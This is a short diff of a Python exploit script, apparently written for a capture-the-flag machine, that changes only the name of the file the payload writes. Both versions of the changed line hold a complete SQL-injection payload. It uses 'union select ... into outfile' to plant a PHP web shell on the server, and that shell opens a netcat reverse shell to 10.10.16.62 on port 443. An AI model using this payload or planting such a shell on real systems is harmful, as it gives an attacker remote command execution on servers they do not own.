@@ -37,7 +37,7 @@ class Exploit():
 
 	# Cambiar IP por la vuestra
 	data_json = {
-		"id": "0 union select 1,2, '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 443 >/tmp/f\"); ?>' into outfile '/srv/altered/public/shells.php';-- -",
+		"id": "0 union select 1,2, '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 443 >/tmp/f\"); ?>' into outfile '/srv/altered/public/shell.php';-- -",
 		"secret": True
 	}
 
